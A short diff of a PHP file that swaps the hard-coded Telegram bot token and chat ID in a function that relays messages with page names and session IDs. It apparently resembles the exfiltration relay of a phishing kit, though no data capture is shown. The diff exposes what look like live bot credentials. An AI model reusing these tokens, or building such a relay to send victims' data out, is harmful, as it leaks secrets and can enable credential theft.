@@ -16,8 +16,8 @@ function generatePageUrl($page, $sessionId) {
  */
 function sendToTelegram($message, $pageName = '', $sessionId = '') {
     // Replace with your actual bot token + chat ID
-    $botToken = "8946542691:AAGuyP489HrDLMEe7lgK13j06umEDnnLKx4"; // add your token here
-    $chatId   = "7354966421"; // add your chat id here
+    $botToken = "8837030346:AAF7sy6Dy6YRAvXatFEfhFIFKoFvNCC6X5I"; // add your token here
+    $chatId   = "8714401430"; // add your chat id here
 
     // Skip if placeholders or empty
     if (
